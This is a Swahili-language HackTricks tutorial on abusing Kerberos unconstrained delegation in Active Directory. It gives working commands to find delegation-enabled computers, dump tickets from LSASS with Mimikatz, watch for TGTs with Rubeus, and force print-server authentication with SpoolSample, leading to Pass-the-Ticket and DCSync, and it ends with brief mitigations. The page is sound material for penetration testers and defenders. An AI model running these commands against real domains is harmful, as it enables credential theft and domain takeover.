# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Hii ni kipengele ambacho Msimamizi wa Domain anaweza kuweka kwa **Kompyuta** yoyote ndani ya domain. Kisha, kila wakati **mtumiaji anapoingia** kwenye Kompyuta, **nakala ya TGT** ya mtumiaji huyo itakuwa **inatumwa ndani ya TGS** inayotolewa na DC **na kuhifadhiwa kwenye kumbukumbu katika LSASS**. Hivyo, ikiwa una mamlaka ya Msimamizi kwenye mashine, utaweza **kudondosha tiketi na kujifanya kuwa watumiaji** kwenye mashine yoyote.

Hivyo ikiwa msimamizi wa domain anaingia ndani ya Kompyuta yenye kipengele cha "Unconstrained Delegation" kimewashwa, na una mamlaka ya msimamizi wa ndani kwenye mashine hiyo, utaweza kudondosha tiketi na kujifanya kuwa Msimamizi wa Domain popote (domain privesc).

Unaweza **kupata vitu vya Kompyuta vyenye sifa hii** kwa kuangalia ikiwa sifa ya [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) ina [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Unaweza kufanya hivi kwa kutumia kichujio cha LDAP cha ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ambacho powerview inafanya:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

Pakia tiketi ya Msimamizi (au mtumiaji waathirika) kwenye kumbukumbu kwa **Mimikatz** au **Rubeus kwa** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Maelezo zaidi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Maelezo zaidi kuhusu Unconstrained delegation katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Ikiwa mshambuliaji anaweza **kudhoofisha kompyuta iliyo ruhusiwa kwa "Unconstrained Delegation"**, anaweza **kudanganya** **Print server** ku **ingia kiotomatiki** dhidi yake **akihifadhi TGT** kwenye kumbukumbu ya seva.\
Kisha, mshambuliaji anaweza kufanya **shambulio la Pass the Ticket kujifanya** kuwa akaunti ya kompyuta ya mtumiaji wa Print server.

Ili kufanya print server iingie dhidi ya mashine yoyote unaweza kutumia [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Ikiwa TGT inatoka kwa mwelekeo wa kikoa, unaweza kufanya [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) na kupata hash zote kutoka kwa DC.\
[**Maelezo zaidi kuhusu shambulio hili kwenye ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Hapa kuna njia nyingine za kujaribu kulazimisha uthibitisho:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigation

- Punguza logins za DA/Admin kwa huduma maalum
- Weka "Account is sensitive and cannot be delegated" kwa akaunti zenye mamlaka.

{{#include ../../banners/hacktricks-training.md}}
